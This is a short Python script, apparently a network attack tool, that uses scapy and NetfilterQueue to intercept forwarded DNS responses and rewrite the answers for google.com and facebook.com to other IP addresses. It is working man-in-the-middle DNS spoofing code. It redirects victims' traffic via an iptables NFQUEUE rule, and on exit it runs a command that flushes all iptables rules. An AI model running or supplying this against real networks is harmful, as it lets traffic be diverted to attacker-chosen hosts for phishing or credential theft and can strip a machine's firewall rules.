from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

#sample
dns_hosts = {
    b"www.google.com.": "202.89.233.101",
    b"google.com.": "202.89.233.101",
    b"facebook.com.": "172.217.19.142"
}


def process_packet(packet):
    print("HIT PACKET!")
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


def modify_packet(packet):
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print("no modification:", qname)
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

def modify_iptables(QUEUE_NUM, command):
    if command == "start":
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    elif command == "flush":
        os.system("iptables --flush")

if __name__ == "__main__":
    QUEUE_NUM = 1
    modify_iptables(QUEUE_NUM, "start")
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        modify_iptables(QUEUE_NUM, "flush")
